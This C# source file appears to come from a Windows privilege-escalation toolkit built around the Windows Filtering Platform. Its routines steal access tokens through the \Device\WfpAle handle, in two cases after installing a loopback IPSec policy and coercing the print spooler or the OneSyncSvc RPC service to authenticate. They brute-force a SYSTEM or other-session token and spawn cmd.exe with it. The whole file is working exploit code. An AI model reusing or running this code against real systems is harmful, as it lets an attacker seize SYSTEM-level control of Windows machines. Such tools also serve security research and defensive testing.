using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using RpcLibrary;
using WfpTokenDup.Interop;

namespace WfpTokenDup.Library
{
    using NTSTATUS = Int32;
    using RPC_STATUS = Int32;

    internal class Modules
    {
        public static bool GetDupicatedTokenAssignedShell(
            int pid,
            IntPtr hTokenHandle)
        {
            IntPtr hWfpAle;
            var requiredPrivileges = new List<string>
            {
                Win32Consts.SE_DEBUG_NAME,      // To get \Device\WfpAle handle
                Win32Consts.SE_IMPERSONATE_NAME // To use Secondary Logon service
            };
            var status = false;

            try
            {
                string processName = Process.GetProcessById(pid).ProcessName;
                Console.WriteLine("[*] Target information:");
                Console.WriteLine("    [*] Process Name : {0}", processName);
                Console.WriteLine("    [*] Process ID   : {0}", pid);
                Console.WriteLine("    [*] Handle Value : 0x{0}", hTokenHandle.ToString("X"));
            }
            catch
            {
                Console.WriteLine("[-] Target process is not found.");
                return false;
            }

            if (!Utilities.EnableTokenPrivileges(
                requiredPrivileges,
                out Dictionary<string, bool> adjustedPrivs))
            {
                foreach (var priv in adjustedPrivs)
                {
                    if (!priv.Value)
                        Console.WriteLine("[-] {0} is not available.", priv.Key);
                }

                return false;
            }

            do
            {
                var hDupToken = IntPtr.Zero;
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO))
                };

                Console.WriteLine("[>] Trying to get a WfpAle handle.");

                hWfpAle = Utilities.GetWfpAleHandle();

                if (hWfpAle == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get WFP handle.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a WfpAle handle (handle = 0x{0}).", hWfpAle.ToString("X"));
                }

                Console.WriteLine("[>] Trying to register the target object handle to WFP.");

                status = Utilities.WfpRegisterToken(
                    hWfpAle,
                    pid,
                    hTokenHandle,
                    out LUID modifiedId);

                if (!status)
                {
                    Console.WriteLine("[-] Target handle is not token or not found.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Token registration maybe successful.");
                    Console.WriteLine("    [*] Modified ID : 0x{0}", modifiedId.ToInt64().ToString("X16"));
                }

                /*
                 * Token registration takes time. So try to fetch token several times.
                 */
                Console.WriteLine("[>] Trying to fetch the registered token.");

                for (var trial = 0; trial < 100; trial++)
                {
                    hDupToken = Utilities.WfpGetRegisteredToken(hWfpAle, in modifiedId);

                    if (hDupToken != IntPtr.Zero)
                        break;
                }

                if (hDupToken == IntPtr.Zero)
                    Console.WriteLine("[-] The registered toke is not found. This technique is not stable, so try again.");
                else
                    Console.WriteLine("[+] Got the registered token (handle = 0x{0}).", hDupToken.ToString("X"));

                Console.WriteLine("[>] Releasing the registered token from WFP.");

                status = Utilities.WfpUnregisterToken(hWfpAle, in modifiedId);

                if (!status)
                    Console.WriteLine("[-] Failed to release the registered token.");
                else
                    Console.WriteLine("[+] The registered token is released successfully.");

                if (hDupToken == IntPtr.Zero)
                    break;

                Console.WriteLine("[>] Trying to spawn token assigned shell with Secondary Logon service.");

                status = NativeMethods.CreateProcessWithToken(
                    hDupToken,
                    LOGON_FLAGS.LOGON_WITH_PROFILE,
                    null,
                    Environment.GetEnvironmentVariable("COMSPEC"),
                    PROCESS_CREATION_FLAGS.CREATE_NEW_CONSOLE,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInfo);
                NativeMethods.NtClose(hDupToken);

                if (status)
                {
                    Console.WriteLine("[+] Got a token assigned shell (PID: {0}).", processInfo.dwProcessId);
                    NativeMethods.NtClose(processInfo.hThread);
                    NativeMethods.NtClose(processInfo.hProcess);
                }
                else
                {
                    Console.WriteLine("[-] Failed to get token assigned shell (Error = {0}).", Marshal.GetLastWin32Error());
                }
            } while (false);

            if (hWfpAle != IntPtr.Zero)
                NativeMethods.NtClose(hWfpAle);

            Console.WriteLine("[*] Done.");

            return status;
        }


        public static bool GetSessionShell(int sessionId)
        {
            NTSTATUS ntstatus;
            var requiredPrivileges = new List<string>
            {
                Win32Consts.SE_DEBUG_NAME,      // To get \Device\WfpAle handle
                Win32Consts.SE_IMPERSONATE_NAME // To use Secondary Logon service
            };
            var hEngine = IntPtr.Zero;
            var status = false;
            var currentSessionId = Helpers.GetTokenSessionId(WindowsIdentity.GetCurrent().Token);

            Console.WriteLine("[*] Current session ID is {0}.", currentSessionId);

            if (!Environment.Is64BitProcess)
            {
                Console.WriteLine("[-] This method currently supports only 64 bit mode.");
                return false;
            }

            if (!Utilities.EnableTokenPrivileges(
                requiredPrivileges,
                out Dictionary<string, bool> adjustedPrivs))
            {
                foreach (var priv in adjustedPrivs)
                {
                    if (!priv.Value)
                        Console.WriteLine("[-] {0} is not available.", priv.Key);
                }

                return false;
            }

            if (NativeMethods.WSAStartup(0x2020, out WSADATA _) != 0)
            {
                Console.WriteLine("[-] Failed to setup Windows socket.");
                return false;
            }

            Console.WriteLine("[>] Trying to spawn shell from session {0}.", sessionId);

            do
            {
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO))
                };
                Globals.WfpAleHandle = Utilities.GetWfpAleHandle();

                if (Globals.WfpAleHandle == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get WFP handle.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a WfpAle handle (handle = 0x{0}).", Globals.WfpAleHandle.ToString("X"));
                }

                Console.WriteLine("[>] Trying to get WFP engine handle.");

                ntstatus = NativeMethods.FwpmEngineOpen0(
                    null,
                    RPC_C_AUTHN_TYPES.DEFAULT,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    out hEngine);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to get WFP engine handle.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a WFP engine handle (hanlde = 0x{0}).", hEngine.ToString("X"));
                }

                if (!Utilities.AllowDesktopAccessForEveryone())
                {
                    Console.WriteLine("[-] Failed to adjust desktop ACL.");
                    break;
                }

                Console.WriteLine("[>] Installing new IPSec policy.");

                status = Utilities.InstallIPSecPolicyIPv4(
                    hEngine,
                    "PrivFuPolicy",
                    in Win32Consts.FWPM_PROVIDER_IKEEXT,
                    "127.0.0.1",
                    "127.0.0.1",
                    "psk",
                    out Guid newPolicyGuid);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to install new IPSec policy.");
                    break;
                }
                else
                {
                    Thread.Sleep(300);
                    Console.WriteLine("[+] New IPSec policy is installed (GUID: {0})", newPolicyGuid.ToString());
                }

                Console.WriteLine("[>] Trying to trigger SyncController query.");

                using (var sync = new SyncController())
                {
                    IntPtr hBinding;
                    var listenerThread = new Thread(new ThreadStart(SyncControllerListenerThread));
                    var timeout = LARGE_INTEGER.FromInt64(-(Globals.Timeout * 10000));

                    do
                    {
                        string endpointPath = null;
                        int targetPid = Helpers.GetServicePidBySession("OneSyncSvc", sessionId);

                        if (targetPid == -1)
                        {
                            Console.WriteLine("[-] Failed to get PID of OneSyncSvc service.");
                            break;
                        }

                        if (Utilities.EnumerateAlpcPortObjectPath(
                            targetPid,
                            out List<string> objectPath))
                        {
                            foreach (var alpcPath in objectPath)
                            {
                                if (alpcPath.StartsWith(@"\RPC Control\LRPC", StringComparison.OrdinalIgnoreCase))
                                {
                                    var valid = RpcHelpers.VerifyInterfaceEndpoint(
                                        alpcPath,
                                        SyntaxIdentifiers.SyncControllerSyntax_1_0);

                                    if (valid)
                                    {
                                        endpointPath = alpcPath;
                                        break;
                                    }
                                }
                            }
                        }

                        if (string.IsNullOrEmpty(endpointPath))
                        {
                            Console.WriteLine("[-] Failed to specify ALPC endpoint.");
                            break;
                        }
                        else
                        {
                            Console.WriteLine("[+] ALPC Endpoint : {0}", endpointPath);
                        }

                        ntstatus = NativeMethods.NtCreateEvent(
                            out IntPtr hStartEvent,
                            ACCESS_MASK.EVENT_ALL_ACCESS,
                            IntPtr.Zero,
                            EVENT_TYPE.SynchronizationEvent,
                            BOOLEAN.FALSE);

                        if (ntstatus != Win32Consts.STATUS_SUCCESS)
                        {
                            Console.WriteLine("[-] Failed to create Event object.");
                            break;
                        }
                        else
                        {
                            Globals.StartNotifyEventHandle = hStartEvent;
                        }

                        ntstatus = NativeMethods.NtCreateEvent(
                            out IntPtr hExitEvent,
                            ACCESS_MASK.EVENT_ALL_ACCESS,
                            IntPtr.Zero,
                            EVENT_TYPE.SynchronizationEvent,
                            BOOLEAN.FALSE);

                        if (ntstatus != Win32Consts.STATUS_SUCCESS)
                        {
                            Console.WriteLine("[-] Failed to create Event object.");
                            NativeMethods.NtClose(Globals.StartNotifyEventHandle);
                            Globals.StartNotifyEventHandle = IntPtr.Zero;
                            break;
                        }
                        else
                        {
                            Globals.ExitNotifyEventHandle = hExitEvent;
                        }

                        listenerThread.Start();

                        ntstatus = NativeMethods.NtWaitForSingleObject(Globals.StartNotifyEventHandle, true, in timeout);

                        if (ntstatus == Win32Consts.STATUS_TIMEOUT)
                        {
                            Console.WriteLine("[-] Failed to start SyncController listener.");
                            break;
                        }

                        hBinding = RpcHelpers.ConnectToRpcServer(sync.SyncController_v1_0_c_ifspec, endpointPath);

                        if (hBinding == IntPtr.Zero)
                        {
                            Console.WriteLine("[-] Failed to connect to RPC server.");
                            break;
                        }
                        else
                        {
                            // RPC_STATUS should be 0x80004005 (E_FAIL)
                            RPC_STATUS rpcStatus = sync.AccountsMgmtRpcDiscoverExchangeServerAuthType(
                                hBinding,
                                "privfu@127.0.0.1",
                                out int _);
                            //RpcHelpers.CloseBindingHandle(ref hBinding);
                            Console.WriteLine("[*] RPC is triggered successfully (RPC_STATUS = 0x{0}).", rpcStatus.ToString("X8"));
                        }

                        NativeMethods.NtWaitForSingleObject(Globals.ExitNotifyEventHandle, true, in timeout);
                    } while (false);
                }

                Console.WriteLine("[>] Uninstalling IPSec policy.");

                ntstatus = NativeMethods.FwpmIPsecTunnelDeleteByKey0(hEngine, in newPolicyGuid);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                    Console.WriteLine("[-] Failed to uninstall IPSec policy.");
                else
                    Console.WriteLine("[+] IPSec policy is uninstalled successfully.");

                if (Globals.SessionToken == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get the target session token.");
                    break;
                }

                Console.WriteLine("[>] Trying to spawn token assigned shell with Secondary Logon service.");

                status = NativeMethods.CreateProcessWithToken(
                    Globals.SessionToken,
                    LOGON_FLAGS.LOGON_WITH_PROFILE,
                    null,
                    Environment.GetEnvironmentVariable("COMSPEC"),
                    PROCESS_CREATION_FLAGS.NONE,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInfo);
                NativeMethods.NtClose(Globals.SessionToken);

                if (status)
                {
                    Console.WriteLine("[+] Got a token assigned shell (PID: {0}).", processInfo.dwProcessId);
                    NativeMethods.NtClose(processInfo.hThread);
                    NativeMethods.NtClose(processInfo.hProcess);
                }
                else
                {
                    Console.WriteLine("[-] Failed to get token assigned shell (Error = {0}).", Marshal.GetLastWin32Error());
                }
            } while (false);

            if (hEngine != IntPtr.Zero)
                NativeMethods.FwpmEngineClose0(hEngine);

            if (Globals.WfpAleHandle != IntPtr.Zero)
                NativeMethods.NtClose(Globals.WfpAleHandle);

            NativeMethods.WSACleanup();

            Console.WriteLine("[*] Done.");

            return status;
        }


        public static bool GetSystemShell()
        {
            NTSTATUS ntstatus;
            IntPtr hWfpAle;
            var requiredPrivileges = new List<string>
            {
                Win32Consts.SE_DEBUG_NAME,      // To get \Device\WfpAle handle
                Win32Consts.SE_IMPERSONATE_NAME // To use Secondary Logon service
            };
            var hEngine = IntPtr.Zero;
            var status = false;

            if (!Environment.Is64BitProcess)
            {
                Console.WriteLine("[-] This method currently supports only 64 bit mode.");
                return false;
            }

            if (!Utilities.EnableTokenPrivileges(
                requiredPrivileges,
                out Dictionary<string, bool> adjustedPrivs))
            {
                foreach (var priv in adjustedPrivs)
                {
                    if (!priv.Value)
                        Console.WriteLine("[-] {0} is not available.", priv.Key);
                }

                return false;
            }

            if (NativeMethods.WSAStartup(0x2020, out WSADATA _) != 0)
            {
                Console.WriteLine("[-] Failed to setup Windows socket.");
                return false;
            }

            do
            {
                var modifiedId = LUID.FromInt64(0L);
                var hSystemToken = IntPtr.Zero;
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO))
                };

                Console.WriteLine("[>] Trying to get a WfpAle handle.");

                hWfpAle = Utilities.GetWfpAleHandle();

                if (hWfpAle == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get WFP handle.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a WfpAle handle (handle = 0x{0}).", hWfpAle.ToString("X"));
                }

                Console.WriteLine("[>] Trying to get WFP engine handle.");

                ntstatus = NativeMethods.FwpmEngineOpen0(
                    null,
                    RPC_C_AUTHN_TYPES.DEFAULT,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    out hEngine);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to get WFP engine handle.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a WFP engine handle (hanlde = 0x{0}).", hEngine.ToString("X"));
                }

                Console.WriteLine("[>] Installing new IPSec policy.");

                status = Utilities.InstallIPSecPolicyIPv4(
                    hEngine,
                    "PrivFuPolicy",
                    in Win32Consts.FWPM_PROVIDER_IKEEXT,
                    "127.0.0.1",
                    "127.0.0.1",
                    "psk",
                    out Guid newPolicyGuid);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to install new IPSec policy.");
                    break;
                }
                else
                {
                    Thread.Sleep(300);
                    Console.WriteLine("[+] New IPSec policy is installed (GUID: {0})", newPolicyGuid.ToString());
                }

                using (var rpc = new MsRprn())
                {
                    var printerName = @"\\127.0.0.1";
                    var devmodeContainer = new DEVMODE_CONTAINER();

                    Console.WriteLine("[>] Triggering printer.");

                    RPC_STATUS rpcStatus = rpc.RpcOpenPrinter(
                        printerName,
                        out IntPtr hPrinter,
                        null,
                        ref devmodeContainer,
                        0);

                    Console.WriteLine("[*] RPC_STATUS is 0x{0}.", rpcStatus.ToString("X8"));
                }

                /*
                 * Token registration takes time. So try to fetch token several times.
                 */
                Console.WriteLine("[>] Trying to find SYSTEM token.");

                for (var trial = 0; trial < 100; trial++)
                {
                    hSystemToken = Utilities.BruteForcingWfpToken(
                        hWfpAle,
                        "S-1-5-18",
                        out modifiedId);

                    if (hSystemToken != IntPtr.Zero)
                        break;
                }

                if (hSystemToken == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to find SYSTEM token. This technique is not stable, so try again.");
                    Console.WriteLine("[-] If not successful after several attempts, try reboot the system.");
                }
                else
                {
                    Console.WriteLine("[+] Got a SYSTEM token (handle = 0x{0}).", hSystemToken.ToString("X"));
                    Console.WriteLine("    [*] Modified ID : 0x{0}", modifiedId.ToInt64().ToString("X16"));
                }

                Console.WriteLine("[>] Uninstalling IPSec policy.");

                ntstatus = NativeMethods.FwpmIPsecTunnelDeleteByKey0(hEngine, in newPolicyGuid);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                    Console.WriteLine("[-] Failed to uninstall IPSec policy.");
                else
                    Console.WriteLine("[+] IPSec policy is uninstalled successfully.");

                if (hSystemToken == IntPtr.Zero)
                    break;

                Console.WriteLine("[>] Trying to spawn token assigned shell with Secondary Logon service.");

                status = NativeMethods.CreateProcessWithToken(
                    hSystemToken,
                    LOGON_FLAGS.LOGON_WITH_PROFILE,
                    null,
                    Environment.GetEnvironmentVariable("COMSPEC"),
                    PROCESS_CREATION_FLAGS.NONE,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInfo);
                NativeMethods.NtClose(hSystemToken);

                if (status)
                {
                    Console.WriteLine("[+] Got a token assigned shell (PID: {0}).", processInfo.dwProcessId);
                    NativeMethods.NtClose(processInfo.hThread);
                    NativeMethods.NtClose(processInfo.hProcess);
                }
                else
                {
                    Console.WriteLine("[-] Failed to get token assigned shell (Error = {0}).", Marshal.GetLastWin32Error());
                }
            } while (false);

            if (hEngine != IntPtr.Zero)
                NativeMethods.FwpmEngineClose0(hEngine);

            if (hWfpAle != IntPtr.Zero)
                NativeMethods.NtClose(hWfpAle);

            NativeMethods.WSACleanup();

            Console.WriteLine("[*] Done.");

            return status;
        }


        private static void SyncControllerListenerThread()
        {
            bool status = Utilities.SetTcpListener(
                "127.0.0.1",
                443,
                Globals.StartNotifyEventHandle,
                out IntPtr hListnerSocket,
                out IntPtr hAcceptSocket);

            if (status)
            {
                for (var trial = 0; trial < 100; trial++)
                {
                    Globals.SessionToken = Utilities.BruteForcingWfpToken(
                        Globals.WfpAleHandle,
                        null,
                        out LUID modifiedId);

                    if (Globals.SessionToken != IntPtr.Zero)
                    {
                        Console.WriteLine("[+] Got a target session token (handle = 0x{0}).", Globals.SessionToken.ToString("X"));
                        Console.WriteLine("    [*] Modified ID : 0x{0}", modifiedId.ToInt64().ToString("X16"));
                        break;
                    }
                }

                NativeMethods.closesocket(hAcceptSocket);
                NativeMethods.closesocket(hListnerSocket);
            }

            NativeMethods.NtSetEvent(Globals.ExitNotifyEventHandle, out int _);
        }
    }
}
